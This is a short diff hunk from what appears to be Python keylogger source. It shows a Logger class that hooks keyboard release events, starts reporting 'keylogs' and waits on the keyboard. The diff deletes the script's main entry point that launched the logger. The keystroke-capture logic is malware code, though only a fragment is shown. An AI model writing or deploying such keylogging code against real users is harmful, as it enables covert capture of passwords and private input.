@@ -53,10 +53,4 @@ class Logger:
         keyboard.on_release(callback=self.callback)
         # start reporting the keylogs
         self.report()
-        # block the current thread, wait until CTRL+C is pressed
         keyboard.wait()
-
-
-if __name__ == "__main__":
-    logger = Logger(delay=REPORT_DELAY)
-    logger.start()
